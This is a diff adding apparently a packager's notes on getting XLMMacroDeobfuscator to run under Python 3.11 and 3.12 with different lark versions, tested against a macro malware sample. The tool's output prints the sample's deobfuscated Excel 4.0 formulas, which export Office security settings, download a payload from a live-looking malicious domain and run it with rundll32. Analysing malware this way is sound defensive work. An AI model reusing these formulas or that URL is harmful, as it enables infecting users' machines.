@@ -1,0 +1,139 @@
+# ===== Works python 3.11
+
+virtualenv --python=$(which python3.11) p3.11
+p3.11/bin/pip3.11 install xlmmacrodeobfuscator
+p3.11/bin/xlmdeobfuscator -f ~/tmp/malware/edd554502033d78ac18e4bd917d023da2fd64843c823c1be8bc273f48a5f3f5f
+$ p3.11/bin/pip3.11 list
+Package              Version
+-------------------- -------
+cffi                 1.16.0
+cryptography         42.0.6
+defusedxml           0.7.1
+lark-parser          0.12.0
+msoffcrypto-tool     5.4.0
+olefile              0.47
+pip                  23.3.2
+pycparser            2.22
+pyxlsb2              0.0.9
+roman                4.2
+setuptools           69.0.3
+untangle             1.2.1
+wheel                0.41.2
+XLMMacroDeobfuscator 0.2.7
+xlrd2                1.3.4
+
+
+# ====== Works python 3.12 - lark-parser<=0.12.0
+virtualenv --python=$(which python3.12) p3.12
+p3.12/bin/pip install setuptools
+p3.12/bin/pip install xlmmacrodeobfuscator
+p3.12/bin/pip uninstall lark-parser -y
+p3.12/bin/pip install lark==0.12.0
+p3.12/bin/xlmdeobfuscator -f ~/tmp/malware/edd554502033d78ac18e4bd917d023da2fd64843c823c1be8bc273f48a5f3f5f
+
+
+$ p3.12/bin/pip list
+Package              Version
+-------------------- -------
+cffi                 1.16.0
+cryptography         42.0.6
+defusedxml           0.7.1
+lark-parser          0.12.0
+msoffcrypto-tool     5.4.0
+olefile              0.47
+pip                  23.3.2
+pycparser            2.22
+pyxlsb2              0.0.9
+roman                4.2
+setuptools           69.5.1
+untangle             1.2.1
+XLMMacroDeobfuscator 0.2.7
+xlrd2                1.3.4
+
+
+
+# ====== Works python 3.12 - lark<1.0.0
+virtualenv --python=$(which python3.12) p3.12
+p3.12/bin/pip install setuptools
+p3.12/bin/pip install xlmmacrodeobfuscator
+p3.12/bin/pip uninstall lark-parser -y
+p3.12/bin/pip install 'lark<1.0.0'
+p3.12/bin/xlmdeobfuscator -f ~/tmp/malware/edd554502033d78ac18e4bd917d023da2fd64843c823c1be8bc273f48a5f3f5f | grep -e "CALL"
+CELL:Q5        , FullEvaluation      , FORMULA("=CALL(""Shell32"",""ShellExecuteA"",""JJCCCJJ"",0,""open"",""C:\Windows\system32\reg.exe"",""EXPORT HKCU\Software\Microsoft\Office\""&GET.WORKSPACE(2)&""\Excel\Security c:\users\public\1.reg /y"",0,5)",R5)
+CELL:Q14       , FullEvaluation      , FORMULA("=CALL(""urlmon"",""URLDownloadToFileA"",""JJCCJJ"",0,""https://ddfspwxrb.club/fb2g424g"",""c:\Users\Public\csg75ef.html"",0,0)",R14)
+CELL:Q16       , FullEvaluation      , FORMULA("=IF(R[-1]C<0,CALL(""urlmon"",""URLDownloadToFileA"",""JJCCJJ"",0,""https://ddfspwxrb.club/fb2g424g"",""c:\Users\Public\bwep5ef.html"",0,0),)",R16)
+CELL:Q18       , FullEvaluation      , FORMULA("=CALL(""Shell32"",""ShellExecuteA"",""JJCCCJJ"",0,""open"",""C:\Windows\system32\rundll32.exe"",""c:\Users\Public\csg75ef.html,DllRegisterServer"",0,5)",R18)
+CELL:R5        , FullEvaluation      , CALL("Shell32","ShellExecuteA","JJCCCJJ",0,"open","C:\Windows\system32\reg.exe","EXPORT HKCU\Software\Microsoft\Office\GET.WORKSPACE(2)\Excel\Security c:\users\public\1.reg /y",0,5)
+CELL:R14       , FullEvaluation      , CALL("urlmon","URLDownloadToFileA","JJCCJJ",0,"https://ddfspwxrb.club/fb2g424g","c:\Users\Public\csg75ef.html",0,0)
+CELL:R16       , FullEvaluation      , IF(R[-1]C<0,CALL("urlmon","URLDownloadToFileA","JJCCJJ",0,"https://ddfspwxrb.club/fb2g424g","c:\Users\Public\bwep5ef.html",0,0),)
+CELL:R18       , FullEvaluation      , CALL("Shell32","ShellExecuteA","JJCCCJJ",0,"open","C:\Windows\system32\rundll32.exe","c:\Users\Public\csg75ef.html,DllRegisterServer",0,5)
+
+
+
+$ p3.12/bin/pip3.12 list
+Package              Version
+-------------------- -------
+cffi                 1.16.0
+cryptography         42.0.6
+defusedxml           0.7.1
+lark                 0.12.0
+msoffcrypto-tool     5.4.0
+olefile              0.47
+pip                  23.3.2
+pycparser            2.22
+pyxlsb2              0.0.9
+roman                4.2
+setuptools           69.5.1
+untangle             1.2.1
+XLMMacroDeobfuscator 0.2.7
+xlrd2                1.3.4
+
+
+# ====== This doesn't work python 3.12 - lark>1.0.0
+virtualenv --python=$(which python3.12) p3.12
+p3.12/bin/pip install setuptools
+p3.12/bin/pip install xlmmacrodeobfuscator
+p3.12/bin/pip uninstall lark-parser -y
+p3.12/bin/pip install 'lark>1.0.0'
+p3.12/bin/xlmdeobfuscator -f ~/tmp/malware/edd554502033d78ac18e4bd917d023da2fd64843c823c1be8bc273f48a5f3f5f | grep -e "CALL"
+
+XLMMacroDeobfuscator: pywin32 is not installed (only is required if you want to use MS Excel)
+
+          _        _______
+|\     /|( \      (       )
+( \   / )| (      | () () |
+ \ (_) / | |      | || || |
+  ) _ (  | |      | |(_)| |
+ / ( ) \ | |      | |   | |
+( /   \ )| (____/\| )   ( |
+|/     \|(_______/|/     \|
+   ______   _______  _______  ______   _______           _______  _______  _______ _________ _______  _______
+  (  __  \ (  ____ \(  ___  )(  ___ \ (  ____ \|\     /|(  ____ \(  ____ \(  ___  )\__   __/(  ___  )(  ____ )
+  | (  \  )| (    \/| (   ) || (   ) )| (    \/| )   ( || (    \/| (    \/| (   ) |   ) (   | (   ) || (    )|
+  | |   ) || (__    | |   | || (__/ / | (__    | |   | || (_____ | |      | (___) |   | |   | |   | || (____)|
+  | |   | ||  __)   | |   | ||  __ (  |  __)   | |   | |(_____  )| |      |  ___  |   | |   | |   | ||     __)
+  | |   ) || (      | |   | || (  \ \ | (      | |   | |      ) || |      | (   ) |   | |   | |   | || (\ (
+  | (__/  )| (____/\| (___) || )___) )| )      | (___) |/\____) || (____/\| )   ( |   | |   | (___) || ) \ \__
+  (______/ (_______/(_______)|/ \___/ |/       (_______)\_______)(_______/|/     \|   )_(   (_______)|/   \__/
+
+    
+XLMMacroDeobfuscator(v0.2.7) - https://github.com/DissectMalware/XLMMacroDeobfuscator
+
+File: /home/mambroz/tmp/malware/edd554502033d78ac18e4bd917d023da2fd64843c823c1be8bc273f48a5f3f5f
+
+Unencrypted xls file
+
+[Loading Cells]
+auto_open: auto_open->'jMAhUST1Sf'!$Q$1
+[Starting Deobfuscation]
+Error [deobfuscator.py:2598 evaluation_result = self.evaluate_parse_tree(current_cell, parse_tree, interactive)]: 'None'
+
+Files:
+
+[END of Deobfuscation]
+time elapsed: 0.4987168312072754
+
+
+# ===== Fedora 39/40 Doesn't work - has lark 1.1.7
+
+
